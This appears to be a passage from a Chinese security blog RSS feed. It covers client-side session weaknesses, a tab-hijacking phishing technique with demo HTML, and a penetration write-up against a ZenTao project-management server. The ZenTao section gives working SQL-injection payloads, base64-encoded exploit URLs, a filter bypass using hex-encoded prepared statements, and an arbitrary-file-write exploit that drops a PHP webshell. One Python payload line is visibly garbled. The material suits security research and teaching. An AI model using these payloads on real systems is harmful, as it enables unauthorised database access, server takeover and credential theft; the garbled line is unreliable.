）&lt;/li&gt;&lt;li&gt;如果客户端session仅加密未签名，利用CBC字节翻转攻击，我们可以修改加密session中某部分数据，来达到身份伪造的目的&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;上面说的几点，各位CTF出题人可以拿去做文章啦~嘿嘿。&lt;/p&gt;&lt;p&gt;相对的，作为一个开发者，如果我们使用的web框架或web语言的session是存储在客户端中，那就必须牢记下面几点：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;没有加密时，用户可以看到完整的session对象&lt;/li&gt;&lt;li&gt;加密/签名不完善或密钥泄露的情况下，用户可以修改任意session&lt;/li&gt;&lt;li&gt;使用强健的加密及签名算法，而不是自己造（反例discuz）&lt;/li&gt;&lt;/ol&gt;</description>
<author>周佩雨</author>
<guid isPermaLink="false">2018-03-26-34936378</guid>
<pubDate>Mon, 26 Mar 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>前端黑魔法之远程控制地址栏</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-03-13-34495488.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/34495488&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-33395718b82a3db6e77cea8f881e7528_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hash=&quot;6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hovercard=&quot;p$b$6f8ffd80705c262c2ee3fa4d9b3f8f06&quot;&gt;@周佩雨&lt;/a&gt;&lt;/p&gt;&lt;p&gt;[ Phith0n，现就职于长亭科技，长期关注并笔耕于安全编码、代码审计等方向]&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;由于今天看到一篇文章《&lt;a href=&quot;https://paper.seebug.org/538/&quot;&gt;危险的 target=&quot;_blank&quot; 与 “opener”&lt;/a&gt;》，里面提到了一个老知识点，就是target=&quot;_blank&quot;的时候，新打开的页面可以通过window.opener来控制源页面的URL，进行钓鱼攻击。这个攻击手法我在博客《&lt;a href=&quot;https://www.leavesongs.com/HTML/opener-fishing.html&quot;&gt;神奇的opener对象&lt;/a&gt;》中也说过，这里就不再赘述了。这篇文章抛出另一种与target有关的钓鱼攻击。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html#0x01&quot;&gt;0x01 效果演示&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;首先可以看一个小例子：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://675ba661.2m1.pw/41593a&quot;&gt;http://675ba661.2m1.pw/41593a&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-90a98df05aa9c08b04f362421c4d3651_r.gif&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1154&quot; data-rawheight=&quot;764&quot; data-thumbnail=&quot;https://pic3.zhimg.com/v2-90a98df05aa9c08b04f362421c4d3651_b.jpg&quot;&gt;&lt;p&gt;打开上述链接，然后点击“click me”，打开了百度。这时查看地址栏，的的确确是百度，然后我们等待10秒，再次查看地址栏，这个时候已经变成攻击者的网址了；即使此时我们再访问淘宝等页面，只要仍然在这个标签页下，地址栏就仍然会被控制。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html#0x02&quot;&gt;0x02 原理说明&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;上述页面的代码也很简单：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;a href=&quot;https://www.baidu.com&quot; target=&quot;baidu&quot; id=&quot;baidu&quot; onclick=&quot;return start()&quot;&amp;gt;click me&amp;lt;/a&amp;gt;

&amp;lt;script&amp;gt;
function start() {
    setInterval(function() {
        baidu.href=&quot;http://675ba661.2m1.pw/baidu&quot;;
        baidu.click();
    }, 10000);
}
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;如果用户点击了超链接“click me”，这里会启动一个循环定时器，每过10秒钟，将会将超链接的地址更换成一个仿百度的钓鱼网站，并再次点击。（当然，如果是真实攻击的话，最好是做一个真实目标的反代服务器，这个在我另一篇文章《&lt;a href=&quot;https://www.leavesongs.com/SOFT/play-with-openresty-lua-web.html&quot;&gt;openresty+lua在反向代理服务中的玩法&lt;/a&gt;》中也有详细的介绍）。&lt;/p&gt;&lt;p&gt;这里，超链接的target属性指定目标URL在哪个页面下打开，就是目标页面的window.name。如果这个a标签的href发生了变化，再次点击链接，页面仍然会在相同的标签页下打开，所以就覆盖了上一次打开的页面。&lt;/p&gt;&lt;p&gt;比如，我们是一个“网址导航”类型的恶意网站，用户在我们网站上打开了百度、淘宝等标签页面，我们将可以根据用户打开的超链接来生成钓鱼页面，伪造这些网站的登录页面，精准地进行钓鱼。我这里就不进行演示了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html#0x03&quot;&gt;0x03 扩展尝试&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;除了超链接以外，用window.open也可以达到一样的效果：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;a href=&quot;javascript:;&quot; onclick=&quot;return start()&quot;&amp;gt;click me&amp;lt;/a&amp;gt;

&amp;lt;script&amp;gt;
function start() {
    var w = window.open(&#39;https://www.baidu.com&#39;, &#39;baidu&#39;);
    setInterval(function() {
        w.location = &#39;http://675ba661.2m1.pw/baidu&#39;
    }, 5000)
}
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;不过，window.open经常会被广告拦截相关的功能给阻止掉，所以可能效果不如直接用超链接。&lt;/p&gt;&lt;p&gt;那么，继续深入研究。这个现象究竟是否和window.name有关呢？那么是不是我们知道了某个页面的name，即可对其页面的URL进行控制？&lt;/p&gt;&lt;p&gt;我们可以做一个实验。编写A页面（ &lt;a href=&quot;http://a.675ba661.2m1.pw/A_victim&quot;&gt;http://a.675ba661.2m1.pw/A_victim&lt;/a&gt; ）：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;p&amp;gt;Hello world.&amp;lt;/p&amp;gt;
&amp;lt;script&amp;gt;
window.name = &#39;baidu&#39;;
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;编写B页面（ &lt;a href=&quot;http://b.675ba661.2m1.pw/B_attacker&quot;&gt;http://b.675ba661.2m1.pw/B_attacker&lt;/a&gt; ）：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;a href=&quot;https://www.baidu.com&quot; target=&quot;baidu&quot; id=&quot;baidu&quot;&amp;gt;click me&amp;lt;/a&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;A页面是目标网站，其中设置自己的name是baidu；B是攻击者的页面，其中设置&lt;code class=&quot;inline&quot;&gt;target=&quot;baidu&quot;&lt;/code&gt; &lt;/p&gt;&lt;p&gt;显然，我们在B中点击“click me”以后，会打开一个新的页面，而不是修改A页面的URL。这个实验说明，URL的远程控制和window.name没有直接关系，而是和页面的父子关系有关。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html#0x04&quot;&gt;0x04 总结&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;本文所描述的攻击方式和opener的攻击方式比较相似，都是在不能跨域的情况下，控制目标标签页的URL，进而进行钓鱼攻击。&lt;/p&gt;&lt;p&gt;但我觉得这个攻击持久型更佳，因为即使用户在新标签中输入自己的域名，或者又通过超链接点击到其他网站里，这个页面的地址栏永远是受到源页面的控制的。理论上在源页面不关闭的情况下，可以永久控制新页面的地址栏。&lt;/p&gt;</description>
<author>小蘑菇</author>
<guid isPermaLink="false">2018-03-13-34495488</guid>
<pubDate>Tue, 13 Mar 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>从SQL注入到Getshell：记一次禅道系统的渗透</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-03-07-34275981.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/34275981&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c9c286b86cab690e0da2551d738fc1d1_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;作者：&lt;/b&gt; &lt;a class=&quot;member_mention&quot; href=&quot;https://www.zhihu.com/people/03f40f07ca96c5b31c8892400eec8c1d&quot; data-hash=&quot;03f40f07ca96c5b31c8892400eec8c1d&quot; data-hovercard=&quot;p$b$03f40f07ca96c5b31c8892400eec8c1d&quot;&gt;@L3m0n&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;此过程为某站点的渗透记录，过程一波三折，但归根结底都是粗心大意造成的，不过自我认为在这个排坑的过程中也学习到了很多。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;确认版本&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;首先可以通过接口来确认一下当前禅道的版本。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://example.com/index.php?mode=getconfig&lt;/code&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c6d7fb7d4b2d437eb33d3644630813b4_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1582&quot;&gt;&lt;h2&gt;&lt;b&gt;SQL注入分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;网上之前有过一个&lt;code class=&quot;inline&quot;&gt;9.1.2&lt;/code&gt;的&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;函数的分析，但是没想到&lt;code class=&quot;inline&quot;&gt;9.2.1&lt;/code&gt;也存在此问题，(&lt;code class=&quot;inline&quot;&gt;2018.3.2&lt;/code&gt;号看到目前最新版本是&lt;code class=&quot;inline&quot;&gt;9.8.1&lt;/code&gt;)。&lt;/p&gt;&lt;p&gt;出问题的地方是此文件的&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;函数：\lib\base\dao\dao.class.php&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;public function orderBy($order)
{
    if($this-&amp;gt;inCondition and !$this-&amp;gt;conditionIsTrue) return $this;

    $order = str_replace(array(&#39;|&#39;, &#39;&#39;, &#39;_&#39;), &#39; &#39;, $order);

    /* Add &quot;`&quot; in order string. */
    /* When order has limit string. */
    $pos    = stripos($order, &#39;limit&#39;);
    $orders = $pos ? substr($order, 0, $pos) : $order;
    $limit  = $pos ? substr($order, $pos) : &#39;&#39;;
    $orders = trim($orders);
    if(empty($orders)) return $this;
    if(!preg_match(&#39;/^(\w+\.)?(`\w+`|\w+)( +(desc|asc))?( *(, *(\w+\.)?(`\w+`|\w+)( +(desc|asc))?)?)*$/i&#39;, $orders)) die(&quot;Order is bad request, The order is $orders&quot;);

    $orders = explode(&#39;,&#39;, $orders);
    foreach($orders as $i =&amp;gt; $order)
    {
        $orderParse = explode(&#39; &#39;, trim($order));
        foreach($orderParse as $key =&amp;gt; $value)
        {
            $value = trim($value);
            if(empty($value) or strtolower($value) == &#39;desc&#39; or strtolower($value) == &#39;asc&#39;) continue;

            $field = $value;
            /* such as t1.id field. */
            if(strpos($value, &#39;.&#39;) !== false) list($table, $field) = explode(&#39;.&#39;, $field);
            if(strpos($field, &#39;`&#39;) === false) $field = &quot;`$field`&quot;;

            $orderParse[$key] = isset($table) ? $table . &#39;.&#39; . $field :  $field;
            unset($table);
        }
        $orders[$i] = join(&#39; &#39;, $orderParse);
        if(empty($orders[$i])) unset($orders[$i]);
    }
    $order = join(&#39;,&#39;, $orders) . &#39; &#39; . $limit;

    $this-&amp;gt;sql .= &#39; &#39; . DAO::ORDERBY . &quot; $order&quot;;
    return $this;
}&lt;/code&gt;&lt;p&gt;对于&lt;code class=&quot;inline&quot;&gt;limit&lt;/code&gt;后未做严格的过滤与判断，然后拼接到了&lt;code class=&quot;inline&quot;&gt;order by&lt;/code&gt;后面导致产生注入.&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$order = join(&#39;,&#39;, $orders) . &#39; &#39; . $limit;&lt;/code&gt;&lt;p&gt;看了一下&lt;code class=&quot;inline&quot;&gt;9.8.1&lt;/code&gt;的修补是对limit进行正则限制，但是事实上感觉此处正则是写了一个bug，比如正常调用&lt;code class=&quot;inline&quot;&gt;orderBy($order)&lt;/code&gt;的时候，其中&lt;code class=&quot;inline&quot;&gt;$order&lt;/code&gt;为&lt;code class=&quot;inline&quot;&gt;abc desc limit 1,1&lt;/code&gt;的时候，进入&lt;code class=&quot;inline&quot;&gt;$limit&lt;/code&gt;则是&lt;code class=&quot;inline&quot;&gt;limit 1,1&lt;/code&gt;，导致匹配失败。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;/* Add &quot;`&quot; in order string. */
/* When order has limit string. */
$pos    = stripos($order, &#39;limit&#39;);
$orders = $pos ? substr($order, 0, $pos) : $order;
$limit  = $pos ? substr($order, $pos) : &#39;&#39;;
if($limit and !preg_match(&#39;/^[0-9]+ *(, *[0-9]+)?$/&#39;, $limit)) $limit = &#39;&#39;;&lt;/code&gt;&lt;p&gt;如果想要造成前台注入（无需登录）的话，就得先看看禅道开放了哪些接口，看是否有调用&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;函数。&lt;/p&gt;&lt;p&gt;\zentao\module\common\model.php&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;public function isOpenMethod($module, $method)
{
   if($module == &#39;user&#39; and strpos(&#39;login|logout|deny|reset&#39;, $method) !== false) return true;
   if($module == &#39;api&#39;  and $method == &#39;getsessionid&#39;) return true;
   if($module == &#39;misc&#39; and $method == &#39;ping&#39;)  return true;
   if($module == &#39;misc&#39; and $method == &#39;checktable&#39;) return true;
   if($module == &#39;misc&#39; and $method == &#39;qrcode&#39;) return true;
   if($module == &#39;misc&#39; and $method == &#39;about&#39;) return true;
   if($module == &#39;misc&#39; and $method == &#39;checkupdate&#39;) return true;
   if($module == &#39;misc&#39; and $method == &#39;changelog&#39;) return true;
   if($module == &#39;sso&#39; and $method == &#39;login&#39;)  return true;
   if($module == &#39;sso&#39; and $method == &#39;logout&#39;) return true;
   if($module == &#39;sso&#39; and $method == &#39;bind&#39;) return true;
   if($module == &#39;sso&#39; and $method == &#39;gettodolist&#39;) return true;
   if($module == &#39;block&#39; and $method == &#39;main&#39;) return true;

   if($this-&amp;gt;loadModel(&#39;user&#39;)-&amp;gt;isLogon() or ($this-&amp;gt;app-&amp;gt;company-&amp;gt;guest and $this-&amp;gt;app-&amp;gt;user-&amp;gt;account == &#39;guest&#39;))
   {
       if(stripos($method, &#39;ajax&#39;) !== false) return true;
       if(stripos($method, &#39;downnotify&#39;) !== false) return true;
       if($module == &#39;tutorial&#39;) return true;
       if($module == &#39;block&#39;) return true;
       if($module == &#39;product&#39; and $method == &#39;showerrornone&#39;) return true;
   }
   return false;
}&lt;/code&gt;&lt;p&gt;其中的&lt;code class=&quot;inline&quot;&gt;if($module == &#39;block&#39; and $method == &#39;main&#39;) return true;&lt;/code&gt;，也就是本次漏洞的主角，继续跟进。&lt;/p&gt;&lt;p&gt;\zentao\module\block\control.php&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;class block extends control
{
    public function __construct($moduleName = &#39;&#39;, $methodName = &#39;&#39;)
    {
        parent::__construct($moduleName, $methodName);
        $this-&amp;gt;selfCall = strpos($this-&amp;gt;server-&amp;gt;http_referer, common::getSysURL()) === 0 || $this-&amp;gt;session-&amp;gt;blockModule;
        if($this-&amp;gt;methodName != &#39;admin&#39; and $this-&amp;gt;methodName != &#39;dashboard&#39; and !$this-&amp;gt;selfCall and !$this-&amp;gt;loadModel(&#39;sso&#39;)-&amp;gt;checkKey()) die(&#39;&#39;);
    }
    public function main($module = &#39;&#39;, $id = 0)
    {
        ...
       $mode = strtolower($this-&amp;gt;get-&amp;gt;mode);
       if($mode == &#39;getblocklist&#39;)
       {   
           ...
       }   
       elseif($mode == &#39;getblockform&#39;)
       {   
           ...
       }   
       elseif($mode == &#39;getblockdata&#39;)
       {
           $code = strtolower($this-&amp;gt;get-&amp;gt;blockid);
    
           $params = $this-&amp;gt;get-&amp;gt;param;
           $params = json_decode(base64_decode($params));
            ....
           $this-&amp;gt;viewType    = (isset($params-&amp;gt;viewType) and $params-&amp;gt;viewType == &#39;json&#39;) ? &#39;json&#39; : &#39;html&#39;;
           $this-&amp;gt;params      = $params;
           $this-&amp;gt;view-&amp;gt;code  = $this-&amp;gt;get-&amp;gt;blockid;
           $this-&amp;gt;view-&amp;gt;title = $this-&amp;gt;get-&amp;gt;blockTitle;
    
           $func = &#39;print&#39; . ucfirst($code) . &#39;Block&#39;;
           if(method_exists(&#39;block&#39;, $func))
           {
               $this-&amp;gt;$func($module);
           }
           else
           {
               $this-&amp;gt;view-&amp;gt;data = $this-&amp;gt;block-&amp;gt;$func($module, $params);
           }
       }
    }
}&lt;/code&gt;&lt;p&gt;首先看&lt;code class=&quot;inline&quot;&gt;__construct&lt;/code&gt;中，&lt;code class=&quot;inline&quot;&gt;$this-&amp;gt;selfCall&lt;/code&gt;是在验证&lt;code class=&quot;inline&quot;&gt;referer&lt;/code&gt;的值，如果为真的话则后面的&lt;code class=&quot;inline&quot;&gt;if&lt;/code&gt;将不会进入&lt;code class=&quot;inline&quot;&gt;die&lt;/code&gt;语句里面&lt;/p&gt;&lt;p&gt;接下来跟进&lt;code class=&quot;inline&quot;&gt;main&lt;/code&gt;函数，可以看到最后的&lt;code class=&quot;inline&quot;&gt;$func = &#39;print&#39; . ucfirst($code) . &#39;Block&#39;;&lt;/code&gt;，会对一些函数进行调用，与此同时，我们搜索&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;的调用的时候可以发现&lt;code class=&quot;inline&quot;&gt;printCaseBlock&lt;/code&gt;函数的存在&lt;/p&gt;&lt;p&gt;\zentao\module\block\control.php&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-dc18e0f1b6d8b747c6ec554acae5d139_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2246&quot;&gt;&lt;p&gt;所以前台注入的整个过程便比较清晰了，那么如何利用?&lt;/p&gt;&lt;h2&gt;&lt;b&gt;SQL注入利用&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;回过头来，因为禅道有windows直接的一键化安装程序，其数据库使用的也是&lt;code class=&quot;inline&quot;&gt;root&lt;/code&gt;权限，导致可直接导出shell，但是如果没有这么高权限的时候，对于这个注入应该如何出数据。&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;sql = &#39;select user()&#39;
param = &#39;{&quot;orderBy&quot;:&quot;order limit 1;select (if(ord(mid((%s),%d,1))=%d,sleep(2),1))--&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&#39; % (sql,n,i) ,1))--&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&#39; % (sql,n,i) &lt;/code&gt;&lt;p&gt;禅道是支持多语句的，这也为后面的利用提供方便。&lt;/p&gt;&lt;p&gt;注入出数据库名和表段名后，当我想继续注入出用户账号密码的时候，意外地发现没有出数据。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;sql = &#39;select 12345 from zt_user&#39;&lt;/code&gt;&lt;p&gt;还是没有出数据，猜测是管理员改了表前缀，所以想去通过&lt;code class=&quot;inline&quot;&gt;information_schema&lt;/code&gt;查询一下表名，但是意外地发现，也不能读取？难道被删了？但是我还是想知道一下表前缀。&lt;/p&gt;&lt;p&gt;请求的时候加了一个单引号，并且加上referer，看一下报错信息。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://example.com/index.php?m=block&amp;amp;f=main&amp;amp;mode=getblockdata&amp;amp;blockid=case&amp;amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxJyIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0=

其中param经过BASE64解码得到
{&quot;orderBy&quot;:&quot;order limit 1,1&#39;&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-2b635f910bb80ada4553155d1c748f29_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2710&quot;&gt;&lt;p&gt;因为PDO的关系，SQL中的表名是&lt;code class=&quot;inline&quot;&gt;%s&lt;/code&gt;替代的，所以未能够得到库名。&lt;/p&gt;&lt;p&gt;那么就利用报错去得到当前SQl语句里面查询的表名，比如利用&lt;code class=&quot;inline&quot;&gt;polygon&lt;/code&gt;函数。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-adbcf88a750df6340c76cb8c7da63235_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2696&quot;&gt;&lt;p&gt;此注入点可以理解为limit后的注入点，因为使用多语句的话，报错效果不明显，所以就直接在limit后面进行注入。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://example.com/index.php?m=block&amp;amp;f=main&amp;amp;mode=getblockdata&amp;amp;blockid=case&amp;amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxIFBST0NFRFVSRSBBTkFMWVNFKHBvbHlnb24oaWQpLDEpIyIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0=

param base64解码
{&quot;orderBy&quot;:&quot;order limit 1,1 PROCEDURE ANALYSE(polygon(id),1)#&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-56760516eb1da1fa547b876b9838bd67_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2544&quot;&gt;&lt;p&gt;上图为本地测试，但是limit的注入和mysql版本还有一些关系，目前网上的payload仅限于低版本才可报错注入出数据，很不幸运的是，目标使用的是高版本mysql。&lt;/p&gt;&lt;p&gt;那既然可以多语句，在不能用&lt;code class=&quot;inline&quot;&gt;information_schema&lt;/code&gt;的情况下，可以通过下面语法来进行盲注：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;show table status where name = &#39;xxx&#39; and sleep(2)&lt;/code&gt;&lt;p&gt;写到py里面的payload是这样的&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;sql = &quot;show table status where hex(substr(name,1,8))=&#39;7a745f75736572%s&#39; and sleep(2)&quot; % binascii.b2a_hex(chr(i))
param = &#39;{&quot;orderBy&quot;:&quot;order limit 1,1;%s--&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&#39; % sql&lt;/code&gt;&lt;p&gt;经过一番折腾发现，表前缀就是默认的&lt;code class=&quot;inline&quot;&gt;zt_&lt;/code&gt;，但是为啥又不能够读取到用户数据呢?&lt;/p&gt;&lt;p&gt;仔细看到禅道里面的&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;函数，发现做了过滤。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$order = str_replace(array(&#39;|&#39;, &#39;&#39;, &#39;_&#39;), &#39; &#39;, $order);&lt;/code&gt;&lt;p&gt;把下划线给过滤掉了，那这种在多语句下，可以利用mysql的预查询来绕过，值得注意的是，这个版本语法大小写敏感。&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;SET @SQL=0x494E5345525420494E544F206D6F76696520286E616D652C20636F6E74656E74292056414C55455320282761616161272C27616161612729;PREPARE pord FROM @SQL;EXECUTE pord;SET @SQL=0x494E5345525420494E544F206D6F76696520286E616D652C20636F6E74656E74292056414C55455320282761616161272C27616161612729;PREPARE pord FROM @SQL;EXECUTE pord;&lt;/code&gt;&lt;p&gt;注入出admin密码的时候，惊喜地发现不能解开，无奈之下，只能先拿到一个普通账号。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Getshell&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;禅道在防止getshell方面还花了一点心思，曾经挖到一个可以任意写文件getshell（最新版本还存在这段代码），不过需要的权限是管理员权限。&lt;/p&gt;&lt;p&gt;看了一下禅道里面人员组织架构情况，有研发、项目经理、产品经理，高层管理，系统管理员等角色，其中系统管理员虽然密码解不开，但是我们可以去解密一下高层管理的密码，因为这个角色的权限是可以修改某用户的用户组权限。在高层管理账号中，我们可以将一个普通账号修改为管理员。&lt;/p&gt;&lt;p&gt;接下来就是写文件Getshell：&lt;/p&gt;&lt;p&gt;/xampp/zentaopro/module/api/control.php&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;public function getModel($moduleName, $methodName, $params = &#39;&#39;)
{
    parse_str(str_replace(&#39;,&#39;, &#39;&amp;amp;&#39;, $params), $params);
    $module = $this-&amp;gt;loadModel($moduleName);
    
    $result = call_user_func_array(array(&amp;amp;$module, $methodName), $params);
    if(dao::isError()) die(json_encode(dao::getError()));
    $output[&#39;status&#39;] = $result ? &#39;success&#39; : &#39;fail&#39;;
    $output[&#39;data&#39;]   = json_encode($result);
    $output[&#39;md5&#39;]    = md5($output[&#39;data&#39;]);
    $this-&amp;gt;output     = json_encode($output);
    die($this-&amp;gt;output);
}&lt;/code&gt;&lt;p&gt;可以看到是进入了call_user_func_array，也就是我们可以任意实例化一个module方法，方法的参数也是可控的，可以通过&lt;code class=&quot;inline&quot;&gt;,&lt;/code&gt;来分割参数。&lt;/p&gt;&lt;p&gt;/zentaopro/module/editor/model.php&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;public function save($filePath)
{
    $fileContent = $this-&amp;gt;post-&amp;gt;fileContent;
    $evils       = array(&#39;eval&#39;, &#39;exec&#39;, &#39;passthru&#39;, &#39;proc_open&#39;, &#39;shell_exec&#39;, &#39;system&#39;, &#39;$$&#39;, &#39;include&#39;, &#39;require&#39;, &#39;assert&#39;);
    $gibbedEvils = array(&#39;e v a l&#39;, &#39;e x e c&#39;, &#39; p a s s t h r u&#39;, &#39; p r o c _ o p e n&#39;, &#39;s h e l l _ e x e c&#39;, &#39;s y s t e m&#39;, &#39;$ $&#39;, &#39;i n c l u d e&#39;, &#39;r e q u i r e&#39;, &#39;a s s e r t&#39;);
    $fileContent = str_ireplace($gibbedEvils, $evils, $fileContent);
    if(get_magic_quotes_gpc()) $fileContent = stripslashes($fileContent);

    $dirPath = dirname($filePath);
    $extFilePath = substr($filePath, 0, strpos($filePath, DS . &#39;ext&#39; . DS) + 4);
    if(!is_dir($dirPath) and is_writable($extFilePath)) mkdir($dirPath, 0777, true);
    if(is_writable($dirPath))
    {
        file_put_contents($filePath, $fileContent);
    }
    else
    {
        die(js::alert($this-&amp;gt;lang-&amp;gt;editor-&amp;gt;notWritable . $extFilePath));
    }
}&lt;/code&gt;&lt;p&gt;在editor中是可以写一个文件的，filePath可控，fileContent也是可控的，这下就是可以任意写一个文件。&lt;/p&gt;&lt;p&gt;Exp:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://example.com/?m=api&amp;amp;f=getModel&amp;amp;moduleName=editor&amp;amp;methodName=save&amp;amp;params=filePath=aaaaaa.php

POST内容:
fileContent=&amp;lt;?php $_POST[1]($_POST[2]);

